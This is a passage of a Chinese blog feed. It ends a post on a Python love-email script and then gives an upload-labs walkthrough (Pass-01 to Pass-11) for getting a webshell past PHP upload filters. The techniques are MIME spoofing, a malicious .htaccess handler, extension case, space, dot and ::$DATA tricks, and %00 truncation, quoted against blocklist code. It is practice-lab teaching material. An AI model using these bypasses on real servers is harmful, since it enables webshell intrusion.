class="built_in">str</span>(soup.find(class_=<span class="string">&#x27;fp-one-imagen&#x27;</span>))).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_today</span>():</span><br><span class="line">    i = datetime.datetime.now()</span><br><span class="line">    date = <span class="string">&quot;%s/%s/%s&quot;</span> % (i.year, i.month, i.day)</span><br><span class="line">    <span class="keyword">return</span> date</span><br></pre></td></tr></table></figure><p>在定义完这几个函数之后下面是一段html代码用来使画面更美观，在html代码后面加上定义的函数使主体程序完成，最后是段发送代码用来实现对邮件的自动发送</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_mail</span>(<span class="params">to_list,sub,content</span>):</span><br><span class="line">    me=name+<span class="string">&quot;&lt;&quot;</span>+mail_user+<span class="string">&quot;&gt;&quot;</span></span><br><span class="line">    msg = MIMEText(content,_subtype=<span class="string">&#x27;html&#x27;</span>,_charset=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    msg[<span class="string">&#x27;Subject&#x27;</span>] = sub</span><br><span class="line">    msg[<span class="string">&#x27;From&#x27;</span>] = me</span><br><span class="line">    msg[<span class="string">&#x27;To&#x27;</span>] = <span class="string">&quot;,&quot;</span>.join(mailto_list)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server = smtplib.SMTP_SSL(mail_host, <span class="number">465</span>)</span><br><span class="line">        server.login(mail_user,mail_pass)</span><br><span class="line">        server.sendmail(me, to_list, msg.as_string())</span><br><span class="line">        server.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> send_mail(mailto_list,mail_title,mail_content):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发送成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;发送失败&quot;</span>)</span><br></pre></td></tr></table></figure><p>这段代码使用了<strong>smtplib</strong>和<strong>email.mime.text</strong>两个库来进行处理。</p><p>本来这是一段很完美的代码，但是却因为是2021年的最后修改的原因，导致彩虹屁这个函数所调用的接口失效，会导致发送邮件的返回值出现奇怪的信息😒于是就开始改造轮子。</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220514223508538.png" alt="image-20220514223508538"></p><h2 id="旧轮子改造计划"><a href="#旧轮子改造计划" class="headerlink" title="旧轮子改造计划"></a>旧轮子改造计划</h2><p> 在发现彩虹屁的接口被废除之后，我访问显示的网站准备获取新的API，但是目标网站并没有把API放在明面上，正在我准备寻找新的接口时，我想到或许我可以用抓包的方式，抓到网站的请求接口</p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220515102055483.png" alt="image-20220515102055483" style="zoom:33%;" /><p>不知道是我这边浏览器的问题还是网站进行了限制，我使用在火狐上挂代理无法在burp抓到对接口的请求包，所以我使用burp自带的浏览器重新请求，成功抓到数据。我们可以发现他的请求接口时<strong>api.shadiao.app&#x2F;chp</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /chp HTTP/2</span><br><span class="line">Host: api.shadiao.app</span><br><span class="line">Sec-Ch-Ua: &quot;(Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;100&quot;</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Origin: https://chp.shadiao.app</span><br><span class="line">Sec-Fetch-Site: same-site</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://chp.shadiao.app/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br></pre></td></tr></table></figure><p>由于获取到的数据时json数据和原本腹黑从原接口请求到的返回值不同，所以我们这里需要重新改造一下<strong>get_chp()</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#api返回值</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;data&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;彩虹屁&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;原以为我已经不会再爱上任何一个人，但看到你的一瞬间我才发现自己错了。你是我的梦中女神，我承认自己心动了&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chp</span>():</span><br><span class="line">    url = <span class="string">&quot;https://chp.shadiao.app/api.php&quot;</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br></pre></td></tr></table></figure><p>原代码用requests库获取到信息后直接取其返回值，但由于新接口时json数据，所以直接返回值的话就会出现如图情况</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220515113524569.png" alt="image-20220515113524569"></p><p>所以我在这边重构一下这个函数，使其可以正常返回彩虹屁，下面是我重构后的函数，最后实现完整效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重构后代码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_chp</span>():</span><br><span class="line">    url = <span class="string">&quot;https://api.shadiao.app/chp&quot;</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    a=resp.json()   <span class="comment">#读取url中的json信息</span></span><br><span class="line">    data_trunk = a[<span class="string">&#x27;data&#x27;</span>]  <span class="comment">#讲json中的data数据提取出来</span></span><br><span class="line">    text = data_trunk[<span class="string">&#x27;text&#x27;</span>] <span class="comment">#讲json中的text数据提取出来</span></span><br><span class="line">    <span class="keyword">return</span> text   <span class="comment">#返回文本彩虹屁文本信息</span></span><br><span class="line"><span class="comment">#效果如下图所示</span></span><br></pre></td></tr></table></figure><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220515114533531.png" alt="image-20220515114533531"></p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>源码配置文件中使用企业微信邮箱开启smtp功能实现自动发送文件的功能，普通QQ邮箱无法实现此功能，但是由于我没有企业微信所以我使用网易邮箱来作为替代品。</p><p>另外需要注意的是，配置文件中出现的密码，是网易邮箱对设备的授权码而不是邮箱密码，用如图所示方法来获取授权码</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220515115131757.png" alt="image-20220515115131757"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;马上就520了不知道各位有没有为女朋友&amp;#x2F;男朋友准备好礼物呢，反正北轨我呢除了准备了一份礼物外还发挥自己的专业能力，为女朋友送上一点小惊喜，那就是今天的主题——如何实现用python自动发送一封爱意满满的邮件&lt;/p&gt;
&lt;h2 id=&quot;拒绝造轮子&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="pyhon" scheme="http://www.beigui.xyz/tags/pyhon/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs通关笔记</title>
    <link href="http://www.beigui.xyz/2022/05/09/upload_labs/"/>
    <id>http://www.beigui.xyz/2022/05/09/upload_labs/</id>
    <published>2022-05-09T11:19:53.000Z</published>
    <updated>2022-09-17T09:16:49.499Z</updated>
    
    <content type="html"><![CDATA[<p>本篇文章仅仅记录通关技巧以及文件上传姿势，具体过程以及相关基础概念就不详细叙述</p><p>环境：<a href="https://github.com/c0ny1/upload-labs">upload-labs</a>（建议用集成环境压缩包或者是docker搭建，手工搭建部分pass可能无法通关）</p><p>工具：burpsuite 2022.3.2</p><p><img src="https://blog-1302407307.cos.ap-nanjing.myqcloud.com/image/image-20220509222929329.png" alt="image-20220509222929329"></p><span id="more"></span><h2 id="Pass-01-JS绕过"><a href="#Pass-01-JS绕过" class="headerlink" title="Pass-01 JS绕过"></a>Pass-01 JS绕过</h2><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>开启代理抓包，发现没有产生流量就进行验证了，说明是前端JS验证</p><p>直接通过burp抓包改一下限制就好了，或者直接F12删除js限制相关代码。</p><p>思路：改webshell后缀为允许上传的.jpg——而后上传——代理拦截，改.jpg为.php——改完后再发送数据包，即可成功上传webshell</p><p><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-1.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-1.png"></a></p><h2 id="Pass-02-文件类型绕过"><a href="#Pass-02-文件类型绕过" class="headerlink" title="Pass-02 文件类型绕过"></a>Pass-02 文件类型绕过</h2><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]            </span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本关对文件类型进行了限制，依旧可以使用burp进行代理拦截改包</p><p>思路：直接上传webshell——burp代理拦截——改文件类型为允许的image&#x2F;jpeg，然后关闭拦截将改完的包发出即可成功上传</p><p><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-2.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-labs-2.png"></a></p><h2 id="Pass-o3-其他可解析类型绕过"><a href="#Pass-o3-其他可解析类型绕过" class="headerlink" title="Pass-o3 其他可解析类型绕过"></a>Pass-o3 其他可解析类型绕过</h2><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br><span class="line"></span><br><span class="line">    if(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span><br><span class="line">        if (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关对文件后缀进行了黑名单限制</p><p>不允许上传.asp .aspx .php .jsp</p><p>思路：通过扫描工具可以得知是服务器是apache,，所以这里可以利用apache的解析顺序，从右到左开始解析文件后缀，如果最右侧的扩展名不可识别，就继续往左判断，直至遇到可以解析的后缀为止所以如果上传文件名类似1.php.xxxx,因为后缀xxxx不能解析，所以向左解析php。</p><p>这里先将文件后缀改为.php3,然后上传成功，结果发现文件路径不对，抓包发现文件名称前缀上传后被改为一个随机名称，这里我们可以通过抓取发送包Repeater获取文件上传后的随机名称</p><h2 id="Pass-04-htacess文件绕过"><a href="#Pass-04-htacess文件绕过" class="headerlink" title="Pass-04 .htacess文件绕过"></a>Pass-04 .htacess文件绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#部分源码</span><br><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</span><br></pre></td></tr></table></figure><p>上传.htacess文件绕过：几乎过滤了所有的后缀名，除了.htaccess</p><p>这里用命令行生成一个.htaccess文件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename .htaccess</span><br></pre></td></tr></table></figure><p>文件内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure><p>先上传这个.htaccess文件，文件作用是往后所有文件都会解析为php，然后再上传图片木马文件（用kali制作，这里就不再赘述），发现能成功上传并解析。</p><h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#部分源码</span></span><br><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>)</span><br></pre></td></tr></table></figure><p>大小写绕过：这关依旧有强大的黑名单，并且限制了.htaccess文件的上传，直接后缀大小写绕过1.phP,用burp查看上传后的文件目录及其名称。</p><h2 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h2><p>这关使用大小写绕过失败，文件被不允许上传，查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#部分源码$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        </span><br><span class="line">$file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];        </span><br><span class="line">$file_name = deldot($file_name);//删除文件名末尾的点        </span><br><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);        </span><br><span class="line">$file_ext = strtolower($file_ext); //转换为小写        </span><br><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure><p>依旧具有强大的黑名单，并且对后缀进行了大小写处理，利用Windows系统的文件名特性。文件名最后增加空格，写成3.php ，上传后保存在Windows系统上的文件名最后的一个空格会被去掉，实际上保存的文件名就是3.php.<br><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-06-1.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-06-1.png"></a></p><p>成功</p><h2 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h2><p>这关和Pass-06差不多，直接点绕过</p><p><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-07-1.png"><img src="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-07-1.png"></a></p><h2 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08 ::$DATA绕过"></a>Pass-08 ::$DATA绕过</h2><p>Windows文件流特性绕过，文件名改成3.php::$DATA，上传成功后保存的文件名其实是3.php</p><h2 id="Pass-09-点-空格-点绕过"><a href="#Pass-09-点-空格-点绕过" class="headerlink" title="Pass-09 点+空格+点绕过"></a>Pass-09 点+空格+点绕过</h2><p>原理同Pass-06，上传文件名后加上点+空格+点，改为3.php. .</p><h2 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h2><p>双写文件名绕过，文件名改成3.pphphp</p><h2 id="Pass-11-文件路径-00截断"><a href="#Pass-11-文件路径-00截断" class="headerlink" title="Pass-11 文件路径%00截断"></a>Pass-11 文件路径%00截断</h2><p>本关技巧为00截断，相关概念请移步csdn查阅相关资料，这里就不加赘述，只介绍相关思路。<br>查看源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);    $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        </span><br><span class="line">$temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];        </span><br><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10,99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            </span><br><span class="line">$is_upload = true;        &#125; </span><br><span class="line">else &#123;            $msg = &#x27;上传出错！&#x27;;        &#125;    &#125; </span><br><span class="line">else&#123;        $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>此关为白名单判断，但$img_path是直接拼接，因此可以利用%00截断绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>本关使用%00截断成功绕过，如果以下条件不满足则可能无法突破</p><p>php版本小于5.3.4，php的magic_quotes_gpc为OFF状态</p><p><a href="https://cdn-zhiji-icu.oss-cn-hangzhou.aliyuncs.com/2021/upload-11-1.png"><img 